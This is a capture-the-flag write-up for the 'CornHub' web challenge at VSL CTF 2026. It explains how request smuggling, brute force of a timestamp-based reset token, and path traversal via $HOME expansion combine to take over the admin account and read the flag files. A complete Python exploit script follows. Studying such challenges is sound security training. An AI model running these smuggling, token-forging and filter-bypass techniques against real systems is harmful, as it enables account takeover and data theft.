# CornHub â€” VSL CTF 2026

> **Room / Challenge:** CornHub (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** VSL CTF 2026
- **Challenge:** CornHub (web)
- **Target / URL:** `https://vsl-ctf.com/challenges#CornHub-34`
- **Points:** `100`
- **Solved:** `54`
- **Date:** `25-01-2026`

---

## Goal

Get admin priviledges in order to read 2 flag files in the server.

## My Solution

There are 3 steps in order to get the flag content:
| # | Vulnerability | Purpose |
| :-- | :--------------: | :-------------------------------------------------: |
| 1 | Request Smuggling | Takeover admin account via the forgot password route |
| 2 | Broken Authentication | Brute-forcing the password reset token |
| 3 | Path Traversal | Reading flag files using environment variable expansion (e.g., `$HOME`) |

### Step 1: Account Takeover via Request Smuggling

Admin access is required to read files, but we didn't have the admin password. However, there is a internal endpoint `/auth/forgot_password` that we can take advantage of to have the reset password token.

We sent a request to `/debug` and tell frontend to forward a `Content-Length: 6` header to the backend, however, actually we sent a bigger body containing another request to `/auth/forgot_password` (smuggled request).

The backend read the first 6 bytes (`data=1`), stopped, and then interpreted the rest of our data as a new request to `/auth/forgot_password`.

### Step 2: Brute-forcing the Reset Token

In `auth_service.py`, the token is generated by 4 content `email`, `username`, `dob` and `timestamp`:

```python
timestamp = datetime.datetime.now().strftime("%Y:%m:%d-%H:%M")
base = f"{user['email']}{user['username']}{user['dob']}{timestamp}"
token = hash_sha256(base)
```

We already knew 3 details from the initial query in `db.py`:

```
Username: admin
Email: admin@cornhub.com
DOB: 2005-08-05
```

The unknown `timestamp` can be brute-forced. We create SHA256 hashes for every minute within a +/- 14-hour of current time, until the tokens match and we can change the password to whatever we want.

### Step 3: Bypassing Filters and Get the Flag

There are several filters from frontend and backend preventing us to read the flag files normally:

The frontend WAF, just check with path `/documents` so we can use `/documents/` to bypass this.

```javascript
app.use((req, res, next) => {
  // ...

  // THE CHECK
  if (req.path === "/documents" && req.method === "POST") {
    //
    const requestStr = JSON.stringify(req.body);
    if (requestStr.includes("flag_2.txt")) {
      //
      return res.status(403).json({
        error: "Access denied - forbidden content detected",
      });
    }
  }

  next();
});
```

The backend filter:

```python
def filter(file_name: str):
    if ".." in file_name or file_name.startswith("/"):  #
        raise HTTPException(status_code=403, detail="Forbidden character(s)")
```

However the main logic of `search_document` still have vulnerability:

```python
def search_document(file_name: str = Form(...)):
    document_dir = "/cornhub"

    try:
        filter(file_name)                                # 1. Check runs first
        normalize_name = os.path.expandvars(file_name)   # 2. Variable expansion happens AFTER check
        file_path = os.path.join(document_dir, normalize_name) # 3. Path joining
        # ...
```

The bypass payload that we can use: `$HOME/flag_1.txt` and `$HOME/flag_2.txt`.

## Exploit Code

```python
import requests
import hashlib
import datetime
import json
import time
import sys
import base64

TARGET = "http://124.197.22.141:6336"
ADMIN_USER = "admin"
ADMIN_PASS = "pwned"
ADMIN_DATA = "admin@cornhub.comadmin2005-08-05" # email + user + dob

s = requests.Session()

def smuggle(payload):
    wrapper = "data=1"
    full_data = wrapper + payload
    # tell frontend content-length is 6, but send much more.
    headers = json.dumps({"Content-Length": "6", "Content-Type": "application/x-www-form-urlencoded"})

    try:
        # use a dummy token to bypass simple frontend checks
        s.post(f"{TARGET}/debug", data={"access_token": "dummy", "headers": headers, "data": full_data}, timeout=0.1)
    except:
        pass

def generate_token(ts):
    return hashlib.sha256(f"{ADMIN_DATA}{ts}".encode()).hexdigest()

def main():
    print("[1] Smuggling /auth/forgot_password")
    smuggle(
        "POST /auth/forgot_password HTTP/1.1\r\n"
        "Host: backend\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 23\r\n\r\n"
        "email=admin@cornhub.com"
    )
    time.sleep(2)

    print("[2] Brute-forcing timestamp of the reset token")
    now = datetime.datetime.now(datetime.timezone.utc)
    timestamps = set()
    for h in range(-13, 14):
        for m in [-2, -1, 0, 1, 2]:
            timestamps.add((now + datetime.timedelta(hours=h, minutes=m)).strftime("%Y:%m:%d-%H:%M"))

    valid_token = None
    for i, ts in enumerate(timestamps):
        if i % 10 == 0: print(f"    Trying timestamps... ({i}/{len(timestamps)})", end="\r")

        token = generate_token(ts)
        body = f"username={ADMIN_USER}&token={token}&new_password={ADMIN_PASS}"

        # send update password request with created brute-forced token
        smuggle(
            "POST /auth/update_password HTTP/1.1\r\n"
            "Host: backend\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            f"Content-Length: {len(body)}\r\n\r\n"
            f"{body}"
        )

        # check if the correct reset token is used to update password
        try:
            res = s.post(f"{TARGET}/login", data={"username": ADMIN_USER, "password": ADMIN_PASS}, timeout=0.5)
            if "access_token" in res.text:
                valid_token = res.json()['access_token']
                print(f"\n[+] password reset. Timestamp: {ts}")
                break
        except:
            pass

        time.sleep(0.01)

    if not valid_token:
        print("\n[-] failed to reset password.")
        sys.exit(1)

    print(f"[3] Retrieving flags")
    # use $HOME, creating an absolute path and bypass the filter
    for filename in ["flag_1.txt", "flag_2.txt"]:
        try:
            # use /documents/ to bypass frontend waf
            r = s.post(f"{TARGET}/documents/", data={
                "file_name": f"$HOME/{filename}",
                "access_token": valid_token
            })
            content = r.json().get('content')
            if content:
                print(f"\n{filename}: {base64.b64decode(content).decode().strip()}")
            else:
                print(f"\n{filename}: Failed ({r.text})")
        except Exception as e:
            print(f"\n{filename}: Error {e}")

if __name__ == "__main__":
    main()
```
